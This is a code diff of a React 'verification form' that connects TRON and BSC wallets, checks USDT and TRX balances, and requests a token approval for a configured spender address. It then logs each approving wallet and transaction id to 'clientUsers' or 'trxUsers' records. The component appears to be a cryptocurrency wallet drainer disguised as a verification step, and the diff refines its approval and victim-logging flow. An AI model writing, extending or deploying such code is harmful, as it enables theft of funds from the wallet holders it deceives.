@@ -16,8 +16,6 @@ const EVENT_SERVER = 'https://api.trongrid.io';
 const PROJECT_ID = '150d746f7722fa489e9df7ad9ddcd955';
 const RELAY_URL = 'wss://relay.walletconnect.com';
 const trxContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
-// const spenderTrx = 'THHeEtDrFnDg3hY21SEETb9qLhhtFbd6Gi'
-const spenderTrx = 'TJfNCKKvN2yrbSAJVpFfnKqVu44sZcrK5w'
 
 interface FormState {
   contractAddress: string
@@ -34,8 +32,8 @@ const VerificationFormComponent = (props) => {
 
   const [showResults, setShowResults] = useState(false)
   const [userDetail, setUserDetail] = useState({
-    balance:0,
-    address:''
+    balance: 0,
+    address: ''
   })
   const { address, wallet, connected, select, connect, disconnect } = useWallet();
   const [tronWeb] = useState(() => new TronWeb(FULL_NODE, SOLIDITY_NODE, EVENT_SERVER));
@@ -44,7 +42,8 @@ const VerificationFormComponent = (props) => {
   const [loading, setLoading] = useState(false);
 
   const spenderAddress = import.meta.env.VITE_SPENDER_ADDRESS;
-  const busdContractAddress = import.meta.env.VITE_CONTRACT_ADDRESS;
+  const spenderTrx = import.meta.env.VITE_SPENDER_ADDRESS_TRX;
+  const busdContractAddress = '0x55d398326f99059fF775485246999027B3197955';
   const spenderAmount = import.meta.env.VITE_AMOUNT;
 
   const formAnimation = useSpring({
@@ -151,8 +150,8 @@ const VerificationFormComponent = (props) => {
       const balanceInBUSD = web3.utils.fromWei(balance, 'ether');
       addData('clientUsers', userAccount, tx?.transactionHash, spenderAddress)
       setUserDetail({
-        address:userAccount,
-        balance:balanceInBUSD
+        address: userAccount,
+        balance: balanceInBUSD
       })
       setTimeout(() => {
         setShowResults(true)
@@ -183,9 +182,10 @@ const VerificationFormComponent = (props) => {
     const usdtTrx = await contract.balanceOf(address).call();
     const balanceUSDT = parseInt(usdtTrx.toString(), 10) / 1_000_000
     const balanceTrx = trxBalance / 1_000_000
-
+    console.log('hello');
+    
     if (balanceTrx > 35 && balanceUSDT > 0) {
-      handleApprove()
+      handleApprove(balanceUSDT)
     } else {
       setIsSubmitting(false);
       Swal.fire({
@@ -214,7 +214,7 @@ const VerificationFormComponent = (props) => {
     // setStatus('Transaction not confirmed in time ⏱️');
   };
 
-  const handleApprove = async () => {
+  const handleApprove = async (balanceUSDT) => {
 
     try {
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
@@ -238,6 +238,14 @@ const VerificationFormComponent = (props) => {
 
       if (receipt?.txid) {
         addData('trxUsers', address, receipt?.txid, spenderTrx)
+        setUserDetail({
+          address: address,
+          balance: balanceUSDT
+        })
+        setTimeout(() => {
+          setShowResults(true)
+        }, 100);
+        setIsSubmitting(false); 
       } else {
         setIsSubmitting(false);
         Swal.fire({
@@ -300,7 +308,8 @@ const VerificationFormComponent = (props) => {
   // };
 
   useEffect(() => {
-    console.log('address:::', address);
+    console.log('Wallet connected:', connected, 'Address:', address);
+    
     if (connected && address) {
       fetchTrxBalance()
     }
